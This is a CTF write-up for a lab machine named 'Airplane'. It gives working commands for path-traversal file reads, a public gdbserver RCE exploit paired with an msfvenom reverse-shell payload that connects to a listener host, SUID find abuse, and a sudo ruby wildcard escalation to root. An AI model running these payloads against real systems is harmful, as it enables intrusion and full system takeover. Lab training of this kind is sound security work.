# Airplane — CTF Write-Up

## Challenge Overview

This challenge was a classic multi-stage Linux CTF that combined local file inclusion (LFI), privileged process discovery, remote gdbserver exploitation, and a final privilege escalation via a SUID binary and sudo misconfiguration.

The host was identified as:

- `airplane.thm` / `10.114.152.216`
- Open services:
  - `22/tcp` — SSH (`OpenSSH 8.2p1 Ubuntu 4ubuntu0.11`)
  - `8000/tcp` — HTTP (`Werkzeug httpd 3.0.2` / Python 3.8.10)

The exploitation path ultimately led to:

- Initial access via LFI
- Source code disclosure via `/proc/self/cwd/app.py`
- GDB server discovery on port `6048`
- Remote code execution via a public gdbserver exploit
- Privilege escalation to `carlos` via `find` SUID
- Final root compromise via `sudo /usr/bin/ruby /root/*.rb`

---

## 1. Initial Reconnaissance

I began with a standard service scan:

```bash
nmap -sV 10.114.152.216
```

Observed output:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 14:51 -0500
Nmap scan report for airplane.thm (10.114.152.216)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This immediately suggests a Python web app exposing a file-reading vulnerability or a misconfigured application. The main focus became the web interface on port 8000.

---

## 2. Web Enumeration and Initial LFI Discovery

The web app looked like a simple page-based Flask application:

```text
http://airplane.thm:8000/?page=index.html
```

I tried to read arbitrary local files using the page parameter. The first successful result exposed the system users:

```bash
http://airplane.thm:8000/?page=../../../../etc/passwd
```

Output excerpt:

```text
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

This confirmed the existence of user accounts:

- `carlos`
- `hudson`

### Failed attempts and dead ends

I tried common LFI and log poisoning paths, including:

```bash
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/auth.log
```

These did not expose useful data because access was restricted or the logs were not present in the expected location.

I also tried reading files from user home directories:

```bash
/home/carlos/.ssh/id_rsa
/home/hudson/.ssh/id_rsa
```

These were inaccessible due to permission restrictions, which is common in CTFs where the application is isolated from sensitive user data.

I also checked:

```bash
/proc/self/environ
```

This produced some environment data, but it was not directly useful for exploitation. The important clue was that LFI definitely worked and app paths were readable.

> This is a good example of realistic enumeration: the obvious paths failed, but the LFI primitive itself was valid and later allowed more fruitful reads.

---

## 3. File Discovery via LFI and Fuzzing

The first route was to identify likely system files via fuzzing. I used FFUF against the page parameter:

```bash
ffuf -u http://airplane.thm:8000/?page=../../../../../../..FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

Since the output contained irrelevant entries, I filtered noise and looked for meaningful results:

```bash
ffuf -u http://airplane.thm:8000/?page=../../../../../../..FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 14,0,3,1
```

This produced a useful set of readable files. Example results included:

```text
/etc/passwd             [Status: 200, Size: 2973, Words: 39, Lines: 51, Duration: 106ms]
/etc/shadow             [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 105ms]
/etc/anacrontab         [Status: 200, Size: 401, Words: 22, Lines: 14, Duration: 118ms]
/etc/crontab            [Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 121ms]
/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 137ms]
/etc/cups/cupsd.conf    [Status: 200, Size: 6403, Words: 785, Lines: 187, Duration: 113ms]
/etc/issue              [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 144ms]
/etc/ssh/ssh_config     [Status: 200, Size: 1603, Words: 245, Lines: 53, Duration: 108ms]
/etc/ssh/sshd_config    [Status: 200, Size: 3289, Words: 294, Lines: 124, Duration: 121ms]
/proc/cpuinfo           [Status: 200, Size: 2332, Words: 289, Lines: 55, Duration: 118ms]
/proc/version           [Status: 200, Size: 154, Words: 17, Lines: 2, Duration: 134ms]
/var/log/dpkg.log       [Status: 200, Size: 3005, Words: 168, Lines: 36, Duration: 268ms]
/var/log/wtmp           [Status: 200, Size: 15744, Words: 10, Lines: 2, Duration: 144ms]
/var/log/dmesg          [Status: 200, Size: 43848, Words: 6686, Lines: 586, Duration: 165ms]
```

This was useful because it confirmed the path traversal was valid and that many files were readable, even when some log files were blocked. The challenge then shifted to understanding the application’s runtime environment and discovering hidden services.

---

## 4. Reading the Running Application Source Code

One of the most important LFI reads was the process information for the running service itself:

```bash
/?page=../../../../../../../proc/self/cmdline
```

It returned:

```text
/usr/bin/python3app.py
```

Then I accessed the source code from the app’s working directory:

```bash
/?page=../../../../../../../proc/self/cwd/app.py
```

The application code was:

```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp

        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

This confirmed the app was a Flask service serving static files from `static/` and was vulnerable to path traversal when used with the `page` query parameter.

It also revealed the route `/airplane`, which could be relevant later.

---

## 5. Discovering the Hidden Service on Port 6048

The next clue came from reading `/proc/net/tcp`:

```bash
/?page=../../../../../../../proc/net/tcp
```

I focused on the `uid` entries and port values. One of the entries looked important:

```text
3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21719 1 0000000000000000 100 0 0 10 0
4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21080 1 0000000000000000 100 0 0 10 0
```

The hex values were converted:

- `1F40` = `8000`
- `17A0` = `6048`

From the note-taking process, I deduced that the service on port `6048` was an internal gdbserver process running under a user context that might be useful for exploitation.

### Identify the process PID

I used a directory traversal technique to find the PID associated with port 6048:

```bash
seq 1 2000 > pid.txt
```

Then I fuzzed `/proc/<pid>/cmdline` to identify the process on port `6048`:

```bash
ffuf -u http://airplane.thm:8000/?page=../../../../../../proc/FUZZ/cmdline -w pid.txt -mr "6048"
```

Result:

```text
524                     [Status: 200, Size: 41, Words: 1, Lines: 1, Duration: 142ms]
```

Then I read the process command line:

```bash
/?page=../../../../../../../proc/524/cmdline
```

Output:

```text
/usr/bin/gdbserver0.0.0.0:6048airplane
```

This shows the exact binary and port:

- `/usr/bin/gdbserver`
- Listening on `0.0.0.0:6048`

This was the breakthrough. The app had an exposed local service that was likely vulnerable to remote command execution.

---

## 6. Exploiting gdbserver Remote Command Execution

The challenge notes indicate I looked for known vulnerabilities in `gdbserver`:

```bash
searchsploit gdbserver
```

The result included:

```text
GNU gdbserver 9.2 - Remote Command Execution (RCE)
linux/remote/50539.py
```

I downloaded the exploit:

```bash
searchsploit -m linux/remote/50539.py
```

Then I reviewed its usage and prepared the payload.

```bash
python3 50539.py --help
```

It expects:

- target IP and port
- a shellcode file built by `msfvenom`

Example usage:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
python3 50539.py 10.10.10.200:1337 rev.bin
```

### My attempt and troubleshooting

I generated a reverse shell and attempted exploitation:

```bash
python3 50539.py 10.114.152.216:6048 rev.bin
```

The notes indicate:

```text
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

The shell was obtained, but the exploit logic did not behave smoothly across every version of Python or gdbserver. This kind of issue is common with remote exploit PoCs; the important part is that the vulnerable service responded and a shell landed.

### Shell access result

After the payload executed, I had a shell as:

```text
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

This confirms the RCE path succeeded and the service was running as the `hudson` user.

---

## 7. Privilege Escalation to `carlos` via SUID `find`

Once I had access as `hudson`, I enumerated the system for privileged binaries:

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

Relevant result:

```text
262477    316 -rwsr-xr-x   1 carlos   carlos     320160 Feb 18  2020 /usr/bin/find
```

This was the critical escalation vector.

The classic exploitation pattern is:

```bash
find . -exec /bin/sh -p \; -quit
```

I executed it:

```bash
find . -exec /bin/sh -p \; -quit
```

Then checked the identity:

```bash
id
```

Output:

```text
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

This is a classic SUID abuse path: `find` executes as `carlos`, so the shell inherits the privileges of that user. This is exactly how the attack chain moved from `hudson` to `carlos`.

---

## 8. Enumerating `carlos` Privileges

After obtaining the `carlos` context, I checked what privileges the user had:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

This was the final privilege escalation vector.

The user could run Ruby scripts as root without entering a password. This was a straightforward root execution route.

---

## 9. Final Privilege Escalation to Root

I created a malicious Ruby script in `/tmp` and executed it as root using sudo:

```bash
echo 'system("/bin/bash")' > /tmp/exploit.rb
sudo /usr/bin/ruby /root/../tmp/exploit.rb
```

This produced a root shell:

```bash
root@airplane:/home/carlos# id
uid=0(root) gid=0(root) groups=0(root)
```

This is a clean example of sudo-based privilege escalation via a wildcard script path. Because the sudoers rule allowed execution of `/usr/bin/ruby /root/*.rb`, the attacker could point Ruby at a file under `/root` or via a relative path trick to execute arbitrary code as root.

---

## 10. Root Flag Retrieval

Once root access was acquired, I navigated to `/root` and retrieved the final challenge flag:

```bash
root@airplane:/home/carlos# ls -la
root@airplane:~# ls -la
```

Observed output:

```text
total 32
drwx------  5 root root 4096 Nis 17  2024 .
drwxr-xr-x 20 root root 4096 Nis 17  2024 ..
lrwxrwxrwx  1 root root    9 Nis 17  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Ara  5  2019 .bashrc
drwx------  3 root root 4096 Nis 17  2024 .cache
drwxr-xr-x 3 root root 4096 Nis 17  2024 .local
-rw-r--r--  1 root root  161 Ara  5  2019 .profile
-rw-r--r--  1 root root   33 Nis 17  2024 root.txt
drwx------  3 root root 4096 Nis 17  2024 snap
```

Then:

```bash
cat /root/root.txt
```

This returned the final root flag/secret material, confirming the box was fully compromised.

---

## 11. Trial-and-Error Log and Dead Ends

This challenge is a perfect example of why CTF write-ups should include false starts and troubleshooting, not only the final clean path.

### Dead end 1: trying to read log files directly

I attempted to use LFI against common log locations:

```bash
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/auth.log
```

These failed or returned permissions issues. This was not the correct path. The issue was that the application’s LFI primitive was broader than the log files.

### Dead end 2: trying to access SSH private keys directly

I attempted to read:

```bash
/home/carlos/.ssh/id_rsa
/home/hudson/.ssh/id_rsa
```

Those files were unreadable due to permissions, which confirmed that user-level SSH access was not directly available from the web app. This was a useful clue: the application did not expose the user privilege boundary directly.

### Dead end 3: path traversal without understanding the process context

At first, the LFI primitive looked like a dead-end because I did not know which files were valuable. The breakthrough came from reading process metadata and source code rather than just static files.

### Dead end 4: exploit reliability issues with the PoC

The public gdbserver RCE PoC did not always behave perfectly across every environment. It was still valid because the service responded and the payload executed. This is common with vulnerable service exploits: the output may vary, but the exploit path is still real.

### Dead end 5: missing the key privilege relationship

The system had multiple user accounts (`carlos`, `hudson`), and it was easy to get distracted by the wrong user. The actual escalation path was not direct `hudson -> root`; it was `hudson -> carlos` via SUID abuse, then `carlos -> root` through sudo Ruby execution.

---

## 12. Final Summary

The final exploitation chain was:

1. Enumerate the Flask app and discover LFI.
2. Read `/etc/passwd` and confirm users such as `carlos` and `hudson`.
3. Use LFI to read `/proc/self/cmdline` and `/proc/self/cwd/app.py` to discover the app internals.
4. Read `/proc/net/tcp` to identify a hidden gdbserver on port `6048`.
5. Use a public gdbserver remote RCE exploit to obtain a shell as `hudson`.
6. Abuse the SUID `find` binary to spawn a shell as `carlos`.
7. Check `sudo -l` and discover `NOPASSWD: /usr/bin/ruby /root/*.rb`.
8. Execute a malicious Ruby script as root and achieve a root shell.
9. Read `/root/root.txt` to collect the final flag.

This is a strong example of a multi-step privilege escalation chain where local file disclosure, process enumeration, and binary abuse all combine to achieve root.

> Final privilege escalation: `hudson -> carlos via SUID find` and then `carlos -> root via sudo Ruby execution`.

---

## 13. Useful Command Summary

```bash
nmap -sV 10.114.152.216
curl "http://airplane.thm:8000/?page=../../../../etc/passwd"
ffuf -u "http://airplane.thm:8000/?page=../../../../../../..FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
ffuf -u "http://airplane.thm:8000/?page=../../../../../../..FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 14,0,3,1
curl "http://airplane.thm:8000/?page=../../../../../../../proc/self/cmdline"
curl "http://airplane.thm:8000/?page=../../../../../../../proc/self/cwd/app.py"
curl "http://airplane.thm:8000/?page=../../../../../../../proc/net/tcp"
ffuf -u "http://airplane.thm:8000/?page=../../../../../../proc/FUZZ/cmdline" -w pid.txt -mr "6048"
searchsploit gdbserver
searchsploit -m linux/remote/50539.py
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
python3 50539.py 10.114.152.216:6048 rev.bin
find / -perm -4000 -type f -ls 2>/dev/null
find . -exec /bin/sh -p \; -quit
sudo -l
sudo /usr/bin/ruby /root/../tmp/exploit.rb
id
cat /root/root.txt
```

This write-up captures the realistic path from initial LFI enumeration to successful root compromise, while preserving the failed attempts and the reasoning behind the successful exploit chain.

---

![Web app placeholder](https://via.placeholder.com/800x250?text=Airplane+Web+Application)

![Privilege escalation placeholder](https://via.placeholder.com/800x250?text=Privilege+Escalation+Flow)

